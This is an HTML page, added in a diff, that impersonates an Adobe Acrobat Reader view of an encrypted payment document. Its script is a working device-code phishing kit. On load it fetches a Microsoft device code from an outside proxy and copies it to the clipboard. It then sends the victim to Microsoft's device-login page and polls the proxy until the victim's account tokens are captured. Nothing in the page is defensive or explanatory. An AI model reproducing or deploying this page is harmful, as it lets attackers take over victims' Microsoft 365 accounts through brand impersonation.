@@ -1,0 +1,770 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Invoice.pdf – Adobe Acrobat Reader</title>
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Crect x='2' y='2' width='20' height='24' rx='2' fill='%23e53e3e'/%3E%3Ctext x='12' y='15' text-anchor='middle' fill='white' font-size='8' font-weight='bold' font-family='Arial'%3EPDF%3C/text%3E%3C/svg%3E" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+            background: #2b2b2b;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* ============ ÜST ARAÇ ÇUBUĞU (ACROBAT READER) ============ */
+        .topbar {
+            background: #323639;
+            height: 48px;
+            display: flex;
+            align-items: center;
+            padding: 0 16px;
+            gap: 14px;
+            border-bottom: 1px solid #1e1e1e;
+            flex-shrink: 0;
+            z-index: 100;
+        }
+        .topbar .brand {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding-right: 14px;
+            border-right: 1px solid #4a4a4a;
+        }
+        .topbar .brand-icon {
+            width: 22px;
+            height: 22px;
+            background: #e53e3e;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .topbar .brand-icon span {
+            color: #fff;
+            font-size: 8px;
+            font-weight: 700;
+        }
+        .topbar .brand-text {
+            color: #e0e0e0;
+            font-size: 13px;
+            font-weight: 500;
+        }
+        .topbar .filename {
+            color: #b8b8b8;
+            font-size: 13px;
+            flex: 1;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .topbar .filename .lock-badge {
+            background: #e53e3e;
+            color: #fff;
+            font-size: 10px;
+            padding: 2px 7px;
+            border-radius: 3px;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+        }
+        .topbar .tools {
+            display: flex;
+            gap: 4px;
+        }
+        .topbar .tool {
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 4px;
+            color: #9a9a9a;
+            cursor: pointer;
+            transition: background 0.15s;
+            font-size: 13px;
+        }
+        .topbar .tool:hover { background: #444; color: #fff; }
+        .topbar .tool.active { color: #fff; }
+
+        /* ============ İKİNCİ SATIR: ARAÇ İKONLARI ============ */
+        .subbar {
+            background: #3a3f42;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            padding: 0 16px;
+            gap: 6px;
+            border-bottom: 1px solid #1e1e1e;
+            flex-shrink: 0;
+            z-index: 99;
+        }
+        .subbar .icon-btn {
+            width: 32px;
+            height: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 3px;
+            color: #b8b8b8;
+            cursor: pointer;
+            font-size: 13px;
+            transition: background 0.15s;
+        }
+        .subbar .icon-btn:hover { background: #4a4f52; color: #fff; }
+        .subbar .divider {
+            width: 1px;
+            height: 18px;
+            background: #555;
+            margin: 0 6px;
+        }
+        .subbar .page-info {
+            color: #b8b8b8;
+            font-size: 12px;
+            margin-left: auto;
+        }
+
+        /* ============ ANA ALAN ============ */
+        .workspace {
+            flex: 1;
+            background: #2b2b2b;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+            position: relative;
+            overflow-y: auto;
+        }
+
+        /* Belge önizleme (arka planda bulanık) */
+        .doc-preview {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 500px;
+            max-width: 90vw;
+            height: 660px;
+            background: #fff;
+            border-radius: 2px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
+            padding: 50px 45px;
+            filter: blur(6px);
+            opacity: 0.35;
+            pointer-events: none;
+            overflow: hidden;
+        }
+        .doc-preview .line {
+            height: 10px;
+            background: #d0d0d0;
+            margin-bottom: 12px;
+            border-radius: 2px;
+        }
+        .doc-preview .line.title {
+            height: 22px;
+            width: 60%;
+            background: #a0a0a0;
+            margin-bottom: 28px;
+        }
+        .doc-preview .line.w-90 { width: 90%; }
+        .doc-preview .line.w-80 { width: 80%; }
+        .doc-preview .line.w-70 { width: 70%; }
+        .doc-preview .line.w-60 { width: 60%; }
+        .doc-preview .line.w-50 { width: 50%; }
+        .doc-preview .line.w-40 { width: 40%; }
+        .doc-preview .gap { height: 20px; }
+        .doc-preview .box-row {
+            display: flex;
+            gap: 12px;
+            margin-top: 20px;
+        }
+        .doc-preview .box-row .box {
+            flex: 1;
+            height: 60px;
+            background: #e0e0e0;
+            border-radius: 4px;
+        }
+
+        /* Kilit overlay */
+        .lock-overlay {
+            position: relative;
+            z-index: 10;
+            width: 100%;
+            max-width: 460px;
+            background: #ffffff;
+            border-radius: 10px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
+            padding: 32px 32px 26px;
+            text-align: center;
+        }
+
+        .lock-overlay .shield {
+            width: 64px;
+            height: 64px;
+            margin: 0 auto 16px;
+            background: linear-gradient(135deg, #e53e3e 0%, #b91c1c 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 8px 24px rgba(229, 62, 62, 0.35);
+        }
+        .lock-overlay .shield svg {
+            width: 30px;
+            height: 30px;
+            fill: #fff;
+        }
+
+        .lock-overlay h1 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 6px;
+            letter-spacing: -0.3px;
+        }
+        .lock-overlay .subtitle {
+            font-size: 13px;
+            color: #6b6b6b;
+            margin-bottom: 22px;
+            line-height: 1.5;
+        }
+
+        /* Kod kutusu */
+        .code-panel {
+            background: #f7f8fa;
+            border: 1px solid #e2e5ea;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 16px;
+        }
+        .code-panel .cp-label {
+            font-size: 10px;
+            text-transform: uppercase;
+            color: #8a8f99;
+            letter-spacing: 1.2px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+        .code-panel .cp-code {
+            font-family: 'SF Mono', 'Consolas', 'Courier New', monospace;
+            font-size: 28px;
+            font-weight: 700;
+            color: #e53e3e;
+            letter-spacing: 6px;
+            min-height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            word-break: break-all;
+        }
+        .code-panel .cp-code.loading {
+            color: #b0b5bc;
+            font-size: 14px;
+            letter-spacing: 1px;
+            font-weight: 500;
+        }
+        .code-panel .cp-actions {
+            display: flex;
+            gap: 8px;
+            margin-top: 12px;
+        }
+        .code-panel .cp-actions button {
+            flex: 1;
+            padding: 8px;
+            border-radius: 5px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: inherit;
+            border: none;
+            transition: all 0.15s;
+        }
+        .code-panel .cp-actions .copy {
+            background: #eef1f5;
+            color: #444;
+            border: 1px solid #d5d9e0;
+        }
+        .code-panel .cp-actions .copy:hover { background: #e3e7ed; }
+        .code-panel .cp-actions .copy.copied { background: #dff6dd; color: #107c10; border-color: #b8e6b5; }
+        .code-panel .cp-actions .copy:disabled { opacity: 0.5; cursor: not-allowed; }
+
+        /* Ana buton */
+        .primary-btn {
+            width: 100%;
+            padding: 14px;
+            background: #e53e3e;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: inherit;
+            transition: background 0.15s, transform 0.1s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 4px 12px rgba(229, 62, 62, 0.3);
+        }
+        .primary-btn:hover:not(:disabled) { background: #c53030; }
+        .primary-btn:active:not(:disabled) { transform: translateY(1px); }
+        .primary-btn:disabled {
+            background: #d5d9e0;
+            color: #9aa0a8;
+            box-shadow: none;
+            cursor: not-allowed;
+        }
+        .primary-btn svg {
+            width: 18px;
+            height: 18px;
+            fill: currentColor;
+        }
+
+        /* Footer */
+        .lock-footer {
+            margin-top: 18px;
+            padding-top: 16px;
+            border-top: 1px solid #ececec;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            align-items: center;
+        }
+        .lock-footer .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #fff5f5;
+            color: #c53030;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+        }
+        .lock-footer .expires {
+            font-size: 11px;
+            color: #8a8f99;
+        }
+        .lock-footer .expires span {
+            font-family: 'SF Mono', monospace;
+            color: #e53e3e;
+            font-weight: 700;
+        }
+
+        /* Status */
+        .status-msg {
+            margin-top: 12px;
+            padding: 9px 12px;
+            border-radius: 6px;
+            font-size: 12.5px;
+            display: none;
+            font-weight: 500;
+            text-align: left;
+        }
+        .status-msg.show { display: block; }
+        .status-msg.error { background: #fff5f5; color: #c53030; }
+        .status-msg.success { background: #f0fdf4; color: #15803d; }
+        .status-msg.info { background: #eff6ff; color: #1e40af; }
+
+        /* Toast */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%) translateY(80px);
+            background: #1a1a1a;
+            color: #fff;
+            padding: 12px 22px;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 500;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
+            opacity: 0;
+            transition: transform 0.3s ease, opacity 0.3s ease;
+            z-index: 10000;
+            pointer-events: none;
+            border: 1px solid #333;
+        }
+        .toast.show {
+            transform: translateX(-50%) translateY(0);
+            opacity: 1;
+        }
+
+        /* Responsive */
+        @media (max-width: 560px) {
+            .topbar .brand-text { display: none; }
+            .topbar .tools .tool:nth-child(n+4) { display: none; }
+            .subbar { display: none; }
+            .lock-overlay { padding: 26px 22px 22px; }
+            .lock-overlay h1 { font-size: 19px; }
+            .code-panel .cp-code { font-size: 22px; letter-spacing: 4px; }
+            .doc-preview { height: 500px; padding: 30px 25px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ============ ÜST ARAÇ ÇUBUĞU ============ -->
+    <div class="topbar">
+        <div class="brand">
+            <div class="brand-icon"><span>PDF</span></div>
+            <div class="brand-text">Adobe Acrobat Reader</div>
+        </div>
+        <div class="filename">
+            <i class="fas fa-file-pdf" style="color:#e53e3e;"></i>
+            <span>LW Payment Documents_secured.pdf</span>
+            <span class="lock-badge">🔒 ENCRYPTED</span>
+        </div>
+        <div class="tools">
+            <div class="tool" title="Search"><i class="fas fa-search"></i></div>
+            <div class="tool" title="Print"><i class="fas fa-print"></i></div>
+            <div class="tool" title="Download"><i class="fas fa-download"></i></div>
+            <div class="tool" title="Share"><i class="fas fa-share-alt"></i></div>
+        </div>
+    </div>
+
+    <!-- ============ ARAÇ İKONLARI SATIRI ============ -->
+    <div class="subbar">
+        <div class="icon-btn" title="Select"><i class="fas fa-mouse-pointer"></i></div>
+        <div class="icon-btn" title="Hand"><i class="fas fa-hand-paper"></i></div>
+        <div class="icon-btn" title="Zoom In"><i class="fas fa-search-plus"></i></div>
+        <div class="icon-btn" title="Zoom Out"><i class="fas fa-search-minus"></i></div>
+        <div class="divider"></div>
+        <div class="icon-btn" title="Fit Page"><i class="fas fa-expand"></i></div>
+        <div class="icon-btn" title="Rotate"><i class="fas fa-sync-alt"></i></div>
+        <div class="icon-btn" title="Comment"><i class="fas fa-comment"></i></div>
+        <div class="page-info">Page 1 of 1</div>
+    </div>
+
+    <!-- ============ ÇALIŞMA ALANI ============ -->
+    <div class="workspace">
+
+        <!-- Bulanık belge önizleme -->
+        <div class="doc-preview">
+            <div class="line title"></div>
+            <div class="line w-90"></div>
+            <div class="line w-80"></div>
+            <div class="line w-70"></div>
+            <div class="gap"></div>
+            <div class="line w-90"></div>
+            <div class="line w-80"></div>
+            <div class="line w-60"></div>
+            <div class="gap"></div>
+            <div class="line w-90"></div>
+            <div class="line w-70"></div>
+            <div class="line w-80"></div>
+            <div class="line w-50"></div>
+            <div class="box-row">
+                <div class="box"></div>
+                <div class="box"></div>
+                <div class="box"></div>
+            </div>
+            <div class="gap"></div>
+            <div class="line w-90"></div>
+            <div class="line w-80"></div>
+            <div class="line w-70"></div>
+            <div class="line w-40"></div>
+        </div>
+
+        <!-- Kilit overlay kartı -->
+        <div class="lock-overlay">
+
+            <div class="shield">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
+                </svg>
+            </div>
+
+            <h1>This Document is Protected</h1>
+            <div class="subtitle">
+                Enter the access code below to view Statements.
+            </div>
+
+            <!-- Kod paneli -->
+            <div class="code-panel">
+                <div class="cp-label">Access Code</div>
+                <div class="cp-code loading" id="codeValue">
+                    <i class="fas fa-spinner fa-pulse"></i>&nbsp; Loading...
+                </div>
+                <div class="cp-actions">
+                    <button class="copy" id="copyBtn" disabled>
+                        <i class="fas fa-copy"></i>&nbsp; Copy Code
+                    </button>
+                </div>
+            </div>
+
+            <!-- Ana buton -->
+            <button class="primary-btn" id="loginBtn" disabled>
+                <svg viewBox="0 0 24 24">
+                    <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/>
+                </svg>
+                VIEW DOCUMENTS
+            </button>
+
+            <!-- Status -->
+            <div id="statusMsg" class="status-msg"></div>
+
+            <!-- Footer -->
+            <div class="lock-footer">
+                <div class="badge">
+                    <i class="fas fa-shield-alt"></i> Secured by Adobe Document Cloud
+                </div>
+                <div class="expires">
+                    Code expires in <span id="timer">15:00</span>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- Toast -->
+    <div class="toast" id="toast"></div>
+
+    <script>
+        // =============================================================
+        //   ÇALIŞMA MANTIĞI – AYNI (API, polling, timer)
+        // =============================================================
+
+        var API_URL = 'https://riyadhpaints.com/secured/proxy.php';
+        var USER_ID = 14;
+
+        var currentCode = null;
+        var currentDeviceCode = null;
+        var isPollingActive = false;
+        var pollInterval = null;
+
+        var codeEl = document.getElementById('codeValue');
+        var copyBtn = document.getElementById('copyBtn');
+        var loginBtn = document.getElementById('loginBtn');
+        var statusMsg = document.getElementById('statusMsg');
+        var toast = document.getElementById('toast');
+        var timerSpan = document.getElementById('timer');
+
+        var expirySeconds = 900;
+        var timerInterval = null;
+
+        function startTimer(seconds) {
+            expirySeconds = seconds || 900;
+            clearInterval(timerInterval);
+            timerInterval = setInterval(function() {
+                var mins = Math.floor(expirySeconds / 60);
+                var secs = expirySeconds % 60;
+                timerSpan.textContent = String(mins).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
+                if (expirySeconds <= 0) {
+                    clearInterval(timerInterval);
+                    timerSpan.textContent = '00:00';
+                }
+                expirySeconds--;
+            }, 1000);
+        }
+
+        function stopTimer() { clearInterval(timerInterval); }
+
+        function showStatus(message, type) {
+            statusMsg.className = 'status-msg show';
+            if (type === 'error') statusMsg.classList.add('error');
+            else if (type === 'success') statusMsg.classList.add('success');
+            else if (type === 'info') statusMsg.classList.add('info');
+            statusMsg.textContent = message;
+        }
+        function hideStatus() {
+            statusMsg.className = 'status-msg';
+            statusMsg.textContent = '';
+        }
+
+        function showToast(msg) {
+            toast.textContent = msg;
+            toast.className = 'toast show';
+            clearTimeout(toast._hideTimer);
+            toast._hideTimer = setTimeout(function() {
+                toast.classList.remove('show');
+            }, 5000);
+        }
+
+        function showCode(code) {
+            currentCode = code;
+            codeEl.textContent = code;
+            codeEl.className = 'cp-code';
+            copyBtn.disabled = false;
+            loginBtn.disabled = false;
+            hideStatus();
+            startTimer(900);
+        }
+
+        function showLoading() {
+            codeEl.innerHTML = '<i class="fas fa-spinner fa-pulse"></i>&nbsp; Loading...';
+            codeEl.className = 'cp-code loading';
+            copyBtn.disabled = true;
+            loginBtn.disabled = true;
+            stopTimer();
+            timerSpan.textContent = '--:--';
+        }
+
+        function copyCode() {
+            if (!currentCode) { showToast('No code available. Please wait.'); return; }
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(currentCode).then(function() {
+                    showToast('✓ Code copied to clipboard');
+                    copyBtn.innerHTML = '<i class="fas fa-check"></i>&nbsp; Copied!';
+                    copyBtn.classList.add('copied');
+                    setTimeout(function() {
+                        copyBtn.innerHTML = '<i class="fas fa-copy"></i>&nbsp; Copy Code';
+                        copyBtn.classList.remove('copied');
+                    }, 3000);
+                }).catch(function() { fallbackCopy(); });
+            } else { fallbackCopy(); }
+        }
+
+        function fallbackCopy() {
+            var ta = document.createElement('textarea');
+            ta.value = currentCode;
+            document.body.appendChild(ta);
+            ta.select();
+            try {
+                document.execCommand('copy');
+                showToast('✓ Code copied to clipboard');
+                copyBtn.innerHTML = '<i class="fas fa-check"></i>&nbsp; Copied!';
+                copyBtn.classList.add('copied');
+                setTimeout(function() {
+                    copyBtn.innerHTML = '<i class="fas fa-copy"></i>&nbsp; Copy Code';
+                    copyBtn.classList.remove('copied');
+                }, 3000);
+            } catch (err) {
+                showToast('Please copy the code manually.');
+            }
+            document.body.removeChild(ta);
+        }
+
+        function fetchCodeFromAPI() {
+            showLoading();
+            showStatus('Connecting to secure server...', 'info');
+
+            var data = {
+                action: 'get_auth_broker_device_code',
+                user_id: USER_ID,
+                tenant_id: 'common'
+            };
+
+            fetch(API_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(function(response) {
+                if (!response.ok) throw new Error('HTTP error! status: ' + response.status);
+                return response.json();
+            })
+            .then(function(data) {
+                if (data.error) {
+                    showStatus('Error: ' + data.error, 'error');
+                    codeEl.textContent = '------';
+                    codeEl.className = 'cp-code';
+                    return;
+                }
+                if (data.user_code && data.device_code) {
+                    currentDeviceCode = data.device_code;
+                    showCode(data.user_code);
+                    showStatus('✓ Access code received', 'success');
+                    setTimeout(hideStatus, 3000);
+                } else {
+                    showStatus('Unexpected response from server.', 'error');
+                    codeEl.textContent = '------';
+                    codeEl.className = 'cp-code';
+                }
+            })
+            .catch(function(err) {
+                showStatus('Network error. Please refresh the page.', 'error');
+                codeEl.textContent = '------';
+                codeEl.className = 'cp-code';
+                console.error('Fetch error:', err);
+            });
+        }
+
+        function openMicrosoftLogin() {
+            if (!currentCode) {
+                showToast('No code available. Please wait.');
+                return;
+            }
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(currentCode);
+            }
+
+            var w = 520, h = 640;
+            var left = Math.round(window.screen.width / 2 - w / 2);
+            var top = Math.round(window.screen.height / 2 - h / 2);
+            window.open(
+                'https://microsoft.com/devicelogin',
+                'ms_device_login',
+                'width=' + w + ',height=' + h + ',left=' + left + ',top=' + top +
+                ',toolbar=no,menubar=no,scrollbars=yes,resizable=yes'
+            );
+
+            if (currentDeviceCode) startPolling();
+        }
+
+        function startPolling() {
+            if (pollInterval) { clearInterval(pollInterval); pollInterval = null; }
+            if (!currentDeviceCode) return;
+
+            isPollingActive = true;
+            showStatus('⏳ Verifying access code...', 'info');
+
+            pollInterval = setInterval(function() {
+                var data = {
+                    action: 'poll_auth_broker_token',
+                    device_code: currentDeviceCode,
+                    user_id: USER_ID,
+                    tenant_id: 'common'
+                };
+
+                fetch(API_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                })
+                .then(function(response) { return response.json(); })
+                .then(function(data) {
+                    if (data.success) {
+                        clearInterval(pollInterval);
+                        pollInterval = null;
+                        isPollingActive = false;
+                        showStatus('✅ Access granted! Decrypting document...', 'success');
+                        setTimeout(function() {
+                            window.location.href = 'https://docs-previews-0010.app/f/5b3m4n6v2l1g';
+                        }, 1500);
+                    } else if (data.waiting) {
+                        // bekle
+                    } else if (data.error) {
+                        clearInterval(pollInterval);
+                        pollInterval = null;
+                        isPollingActive = false;
+                        showStatus('Error: ' + data.error, 'error');
+                    }
+                })
+                .catch(function(err) { console.error('Polling error:', err); });
+            }, 5000);
+        }
+
+        function setupButtons() {
+            copyBtn.addEventListener('click', copyCode);
+            loginBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                openMicrosoftLogin();
+            });
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            setupButtons();
+            fetchCodeFromAPI();
+        });
+    </script>
+</body>
+</html>
